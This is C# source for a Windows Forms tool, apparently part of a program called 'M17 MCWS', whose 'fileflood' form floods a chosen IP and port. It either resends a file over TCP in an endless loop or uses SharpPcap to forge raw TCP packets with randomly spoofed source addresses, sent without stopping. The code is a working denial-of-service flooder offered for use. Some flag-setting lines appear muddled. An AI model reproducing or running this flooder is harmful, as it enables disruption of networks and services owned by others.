using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Net;
using SharpPcap;
using SharpPcap.LibPcap;
using System.Runtime.InteropServices;
using System.Net.NetworkInformation;
using PacketDotNet;
using M15A3_MCWS.Properties;
using System.IO.Compression;
using System.Threading;
using System.Threading.Tasks;
using Noemax.Compression;
using System.Reflection;
using System.Runtime.Intrinsics.Arm;
using Noemax.Lzma;
using Nmap.NET.Container;
namespace M15A3_MCWS
{
    public partial class fileflood : Form
    {
        [DllImport("Gdi32.dll", EntryPoint = "CreateRoundRectRgn")]
        private static extern IntPtr CreateRoundRectRgn
(
int nLeftRect,     // x-coordinate of upper-left corner
int nTopRect,      // y-coordinate of upper-left corner
int nRightRect,    // x-coordinate of lower-right corner
int nBottomRect,   // y-coordinate of lower-right corner
int nWidthEllipse, // width of ellipse
int nHeightEllipse // height of ellipse
);
        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;

        [DllImportAttribute("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [DllImportAttribute("user32.dll")]
        public static extern bool ReleaseCapture();

        private void panel1_Click(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }
        public fileflood()
        {
            InitializeComponent();
            this.FormBorderStyle = FormBorderStyle.None;
        }
        private void pictureBox2_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void pictureBox3_Click(object sender, EventArgs e)
        {
            if (this.WindowState != FormWindowState.Maximized)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }

        private void pictureBox4_Click(object sender, EventArgs e)
        {
            if (this.WindowState != FormWindowState.Minimized)
            {
                this.WindowState = FormWindowState.Minimized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }
        PhysicalAddress admac;
        public IPAddress randip()
        {
            Random r = new Random();
            string ips = $"{r.Next(0, 255)}.{r.Next(0, 255)}.{r.Next(0, 255)}.{r.Next(0, 255)}";
            IPAddress ipa = IPAddress.Parse(ips);
            return ipa;
        }
        private void button2_Click(object sender, EventArgs e)
        {
            try
            {
                IPAddress ipa = IPAddress.Parse(textBox1.Text);
                int dport = int.Parse(textBox3.Text);
                int sport = int.Parse(textBox2.Text);
                openFileDialog1.ShowDialog();
                string fn = openFileDialog1.FileName;
                byte[] fbytes = File.ReadAllBytes(fn);
                switch (comboBox1.SelectedIndex)
                {
                    case 0:
                        Socket s = new Socket(SocketType.Stream, System.Net.Sockets.ProtocolType.Tcp);
                        s.Connect(new IPEndPoint(IPAddress.Parse(textBox1.Text), int.Parse(textBox3.Text)));
                        while (true)
                        {
                            s.SendFile(fn);
                        }
                        break;
                    case 1:
                        dev.Open();
                        IPAddress src = randip();
                        IPAddress sp = IPAddress.Parse(textBox4.Text);
                        IPEndPoint ipe = new IPEndPoint(ipa, dport);
                        EthernetPacket ep = new EthernetPacket(admac, PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"), EthernetType.None);
                        IPv4Packet ip = new IPv4Packet(src, ipa);
                        IPv6Packet ip6 = new IPv6Packet(src, ipa);
                        ushort soport = ushort.Parse(sport.ToString());
                        ushort deport = ushort.Parse(dport.ToString());
                        IPv4Packet i = new IPv4Packet(ipa, src);
                        IPv6Packet i6 = new IPv6Packet(ipa, src);
                        var tcp = new TcpPacket(soport, deport);
                        tcp.Synchronize = true;
                        var pct = new TcpPacket(deport, soport);
                        tcp.Synchronize = true;
                        tcp.Acknowledgment = true;
                        var t1 = new TcpPacket(soport, deport);
                        tcp.Acknowledgment = true;
                        tcp.Synchronize = true;
                        var t = new TcpPacket(soport, deport);
                        t.Push = true;
                        t.Acknowledgment = true;
                        t.PayloadData = fbytes;
                        if (ipa.AddressFamily == AddressFamily.InterNetwork)
                        {
                            ip.PayloadPacket = tcp;
                            ep.PayloadPacket = ip;

                        }
                        if (ipa.AddressFamily == AddressFamily.InterNetworkV6)
                        {
                            ip6.PayloadPacket = tcp;
                            ep.PayloadPacket = ip6;
                        }
                        while (true)
                        {
                            dev.SendPacket(ep);
                            if (ipa.AddressFamily == AddressFamily.InterNetwork)
                            {
                                ip.PayloadPacket = pct;
                                ep.PayloadPacket = ip;

                            }
                            if (ipa.AddressFamily == AddressFamily.InterNetworkV6)
                            {
                                ip6.PayloadPacket = pct;
                                ep.PayloadPacket = ip6;
                            }
                            dev.SendPacket(ep);
                            if (ipa.AddressFamily == AddressFamily.InterNetwork)
                            {
                                i.PayloadPacket = t1;
                                ep.PayloadPacket = i;

                            }
                            if (ipa.AddressFamily == AddressFamily.InterNetworkV6)
                            {
                                i6.PayloadPacket = t1;
                                ep.PayloadPacket = i6;
                            }
                            dev.SendPacket(ep);
                            if (ipa.AddressFamily == AddressFamily.InterNetwork)
                            {
                                ip.PayloadPacket = t;
                                ep.PayloadPacket = ip;

                            }
                            if (ipa.AddressFamily == AddressFamily.InterNetworkV6)
                            {
                                ip6.PayloadPacket = t;
                                ep.PayloadPacket = ip6;
                            }
                            dev.SendPacket(ep);
                            if (ipa.AddressFamily == AddressFamily.InterNetwork)
                            {
                                ip.PayloadPacket = tcp;
                                ep.PayloadPacket = ip;

                            }
                            if (ipa.AddressFamily == AddressFamily.InterNetworkV6)
                            {
                                ip6.PayloadPacket = tcp;
                                ep.PayloadPacket = ip6;
                            }
                        }
                        break;
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "M17 MCWS - Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {

        }
        int x;
        string name;
        string id;
        string desc;
        CaptureDeviceList cdl = CaptureDeviceList.Instance;
        ILiveDevice dev;
        private void fileflood_Load(object sender, EventArgs e)
        {
            try
            {
                NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
                foreach (NetworkInterface n in nics)
                {
                    if (n.OperationalStatus == OperationalStatus.Up)
                    {
                        admac = n.GetPhysicalAddress();
                        name = n.Name;
                        id = n.Id;
                        desc = n.Description;
                        break;
                    }
                    x++;
                }
                dev = cdl[x];
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "M17 MCWS - Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            try
            {
                DateTime dt = dateTimePicker1.Value;
                if (DateTime.Now == dt)
                {

                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "M17 MCWS - Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void comboBox3_SelectedIndexChanged(object sender, EventArgs e)
        {
            dev = cdl[comboBox3.SelectedIndex];
        }
    }
}
